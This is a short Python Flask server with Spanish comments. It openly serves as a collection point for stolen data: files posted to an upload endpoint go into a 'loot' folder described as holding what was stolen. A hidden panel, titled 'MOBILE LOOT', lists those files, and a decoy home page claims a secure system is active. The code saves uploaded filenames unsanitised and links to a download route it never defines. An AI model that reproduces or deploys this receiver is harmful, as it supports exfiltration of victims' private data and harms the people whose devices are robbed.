from flask import Flask, request, render_template_string
import datetime
import os

app = Flask(__name__)

# Directorio para guardar lo robado
UPLOAD_FOLDER = 'loot'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

@app.route('/svr_upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return "No file", 400
    file = request.files['file']
    file.save(os.path.join(UPLOAD_FOLDER, file.filename))
    return "OK", 200

@app.route('/panel-secreto-svr')
def ver_loot():
    files = os.listdir(UPLOAD_FOLDER)
    return f"<html><body style='background:#000; color:#0f0;'><h2>🛰️ SVR-MATRIX: MOBILE LOOT</h2><ul>" + \
           "".join([f"<li><a href='/download/{f}' style='color:#0f0;'>{f}</a></li>" for f in files]) + \
           "</ul></body></html>"

@app.route('/')
def home():
    return "<h1>SVR-SECURE: SISTEMA ACTIVO</h1>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
